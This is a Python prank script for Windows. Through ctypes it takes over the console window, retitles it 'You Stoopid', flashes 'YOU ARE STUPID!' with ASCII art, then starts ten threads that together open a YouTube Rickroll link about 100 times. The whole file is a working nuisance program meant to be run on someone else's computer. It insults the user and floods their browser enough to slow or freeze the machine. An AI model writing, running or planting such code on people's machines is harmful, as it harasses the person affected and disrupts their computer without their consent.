import os
import ctypes
import webbrowser
from ctypes import wintypes
from threading import Thread
import time

def open_website():
    for i in range(10):
    	webbrowser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ")

user32 = ctypes.WinDLL("user32", use_last_error=True)
kernel32 = ctypes.windll.kernel32

active_window = user32.GetForegroundWindow()
current_window = kernel32.GetConsoleWindow()

FindWindowW = user32.FindWindowW
FindWindowW.argtypes = [wintypes.LPCWSTR, wintypes.LPCWSTR]
FindWindowW.restype = wintypes.HWND

os.system("")
os.system('echo "\033]0;You Stoopid\007"')
os.system("cls")

user32.ShowWindow(current_window, 3)

screen_width = user32.GetSystemMetrics(0)
screen_height =  user32.GetSystemMetrics(1)

x, y, width, height = screen_width//2-(screen_width//4), screen_height//2-(screen_height//4), screen_width//2, screen_height//2

user32.MoveWindow(current_window, x, y, width, height, True)

text = ["YOU", "ARE", "STUPID!"]

for i in text:
    print(i)
    time.sleep(1.5)

os.system("cls")

print("""
                      █████████
  ███████          ███         ███
  █      █       ███             ███
   █      █    ██                  ██
    █     █   ██     ██      ██     ███
    █   █    █      ████    ████      ██
   █████████████                      ██
   █            █         █           ██
 ██             █   ██          ██    ██
██   ███████████     ██        ██     ██
█               █      ████████       ██
██              █                    ██
 █   ███████████                   ██
 ██          ████                 █
  ████████████   █████████████████
""")

threads = []

for i in range(10):
    threads.append(Thread(target=open_website))
    threads[i].start()
